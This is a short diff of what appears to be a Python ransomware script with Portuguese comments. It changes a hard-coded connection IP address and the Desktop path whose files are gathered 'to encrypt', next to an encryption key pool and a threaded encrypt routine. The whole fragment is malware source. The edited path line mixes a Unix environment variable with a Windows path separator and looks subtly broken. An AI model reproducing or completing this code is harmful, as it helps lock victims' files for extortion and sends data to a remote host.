@@ -32,7 +32,7 @@ def encrypt(key):
         q.task_done()
 
 #informação de conexao        
-IP_ADDRESS = '192.168.1.85'
+IP_ADDRESS = '192.168.0.121'
 PORT = 5678
 
 #Informação da encriptacao
@@ -42,7 +42,7 @@ key_char_pool_len = len(key_char_pool)
 
 #Pega filepaths para encriptar
 print("preparando arquivos...")
-desktop_path = os.environ['USERPROFILE']+'\\Desktop'
+desktop_path = os.environ['USER']+'\\Desktop'
 files = os.listdir(desktop_path)
 abs_files = []
 for f in files:
